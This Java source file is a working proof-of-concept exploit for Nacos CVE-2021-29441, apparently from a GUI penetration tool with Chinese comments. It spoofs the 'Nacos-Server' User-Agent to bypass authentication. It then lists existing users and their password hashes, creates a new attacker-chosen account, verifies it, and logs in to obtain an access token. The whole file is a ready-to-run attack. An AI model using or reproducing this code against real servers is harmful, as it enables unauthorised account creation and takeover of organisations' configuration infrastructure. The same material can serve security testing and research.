package nacos.poc;

import javafx.scene.control.TextArea;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Code_Cve_2021_29441 {

    private boolean flag = true;
    private TextArea textArea = null;

    public TextArea getTextArea() {
        return textArea;
    }

    public void setTextArea(TextArea textArea) {
        this.textArea = textArea;
    }

    /**
     * Nacos 漏洞
     * CVE-2021-29441 未授权访问
     */
    public void run(String url, String userName, String passWord, TextArea textArea){
        // info 赋予全局变量
        setTextArea(textArea);
        // 1、验证是否能未授权访问用户列表
        listUser(url);
        // 2、尝试添加新用户
        addUser(url,userName,passWord);
        // 3、检查用户是否添加成功
        checkUser(url,userName);
        // 4、使用新用户登录
        login(url,userName,passWord);
    }

    public StringBuilder listUser(String url){

        StringBuilder response = null;
        try {
            // 设置 POST 请求的 URL 和请求体
            String path = "/nacos/v1/auth/users?pageNo=1&pageSize=50";
            URI baseUri = new URI(url);
            url = baseUri.resolve(path).toString();

            System.out.println(url);
            if (flag){
                printInfo("[+] 1、验证是否能未授权访问用户列表");
            }
            printInfo("[+] 访问地址为:" + url);

            // 创建 URL 对象
            URL apiUrl = new URL(url);

            // 打开连接
            HttpURLConnection connection = (HttpURLConnection) apiUrl.openConnection();

            // 设置请求方法为 GET
            connection.setRequestMethod("GET");

            // 启用输出流，并设置请求头
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("User-Agent","Nacos-Server");

            // 获取返回包信息
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }

            reader.close();

            if(flag){
                // 输出返回包信息
                printInfo("[+] 访问成功");
                printInfo("[+] 响应包:" + response.toString());
                printInfo("[+]");
            }

        }catch (Exception e){
            if (e instanceof ConnectException){
                printInfo("[-] 无法连接到服务器:"+e.getMessage());
                printInfo("[-]");
            } else if (e instanceof MalformedURLException) {
                printInfo("[-] URL格式不正确:"+e.getMessage());
                printInfo("[-]");
            }
        }
        return response;
    }

    public void addUser(String url,String userName,String passWord) {
        printInfo("[+] 2、尝试添加新用户");
        try {
            // 设置 POST 请求的 URL 和请求体
            String path =  "/nacos/v1/auth/users";
            URI baseUri = new URI(url);
            url = baseUri.resolve(path).toString();

            String requestBody = "username=" + userName + "&password=" + passWord;
            printInfo("[+] 访问地址为：" + url);

            // 创建 URL 对象
            URL apiUrl = new URL(url);

            // 打开连接
            HttpURLConnection connection = (HttpURLConnection) apiUrl.openConnection();

            // 设置请求方法为 GET
            connection.setRequestMethod("POST");

            // 启用输出流,并设置请求头
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("User-Agent","Nacos-Server");

            // 获取输出流，写入请求体
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(requestBody.getBytes());

            // 发送POST请求
            outputStream.flush();
            outputStream.close();

            BufferedReader reader;
            StringBuilder response;
            String line;

            // 判断用户名是否被注册
            if (connection.getResponseCode() == 400) {
                // 读取响应内容
                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                // 输出响应内容
                printInfo("[-] 用户已注册");
                printInfo("[-] 响应包: " + response.toString());
                printInfo("[-]");printInfo("[-]");
            } else if (connection.getResponseCode() == 200){
                // 获取返回包信息
                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                // 匹配相应包，判断是否注册成功
                String pattern = "create user ok";
                Pattern r = Pattern.compile(pattern);
                Matcher m = r.matcher(response.toString());

                if (m.find()) {
                    printInfo("[+] 注册成功");
                    printInfo("[+] 响应包:" + response.toString());
                    printInfo("[+]");
                } else {
                    printInfo("[-] 注册失败");
                    printInfo("[-] 响应包:" + response.toString());
                    printInfo("[-]");
                }
            }
        }catch (Exception e){
            if (e instanceof ConnectException){
                printInfo("无法连接到服务器:"+e.getMessage());
            } else if (e instanceof MalformedURLException) {
                printInfo("URL格式不正确:"+e.getMessage());
            }
            System.out.println(e.getMessage());
        }
    }

    public void checkUser(String url, String userName){

        printInfo("[+] 3、检查用户是否添加成功");

        // 匹配相应包，判断是否注册成功
        this.flag = false;
        StringBuilder response = listUser(url);
        this.flag = true;
        String pattern = "\"username\":\"" + userName + "\",\"password\":\"(.*?)\"";

        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(response.toString());

        if (m.find()) {
            printInfo("[+] 查询成功" );
            printInfo("[+] 响应包:"+response.toString());
            printInfo("[+] new UserName: " + userName);
            printInfo("[+] new PassWord: " + m.group(1));
            printInfo("[+]");
        } else {
            printInfo("[-] 查询失败");
            printInfo("[-]");
        }
    }

    public void login(String url ,String userName,String passWord) {
        printInfo("[+] 4、尝试登录新用户");
        try {
            // 设置 POST 请求的 URL 和请求体
            String requestBody = "username=" + userName + "&password=" + passWord;

            String path =  "/nacos/v1/auth/users/login";
            URI baseUri = new URI(url);
            url = baseUri.resolve(path).toString();

            printInfo("[+] 访问地址为：" + url);

            // 创建 URL 对象
            URL apiUrl = new URL(url);

            // 打开连接
            HttpURLConnection connection = (HttpURLConnection) apiUrl.openConnection();

            // 设置请求方法为 GET
            connection.setRequestMethod("POST");

            // 启用输出流，并设置请求头
            connection.setDoOutput(true);

            // 获取输出流，写入请求体
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(requestBody.getBytes());

            // 发送POST请求
            outputStream.flush();
            outputStream.close();

            BufferedReader reader;
            StringBuilder response;
            String line;

            // 判断用户名是否被注册
            if (connection.getResponseCode() == 403) {
                // 读取响应内容
                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                // 输出响应内容
                printInfo("[-] 登录失败");
                printInfo("[-] 响应包: " + response.toString());
                printInfo("[-]");
            } else if (connection.getResponseCode() == 200){
                // 获取返回包信息
                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                // 匹配相应包，判断是否注册成功
                String pattern = "\"accessToken\":\"(.*?)\"";
                Pattern r = Pattern.compile(pattern);
                Matcher m = r.matcher(response.toString());

                if (m.find()) {
                    printInfo("[+] 登录成功");
                    printInfo("[+] accessToken:" + m.group(1));
                    printInfo("[+] 使用新注册的账户和密码访问 /nacos 登录即可");
                } else {
                    printInfo("[-] 登录失败");
                    printInfo("[-] 响应包:" + response.toString());
                }
            }
        }catch (Exception e){
            if (e instanceof ConnectException){
                printInfo("[-] 无法连接到服务器:"+e.getMessage());
            } else if (e instanceof MalformedURLException) {
                printInfo("[-] URL格式不正确:"+e.getMessage());
            }
            System.out.println(e.getMessage());
        }
    }

    public void printInfo(String info){
        System.out.println(info);
        getTextArea().appendText(info + "\n");
    }
}
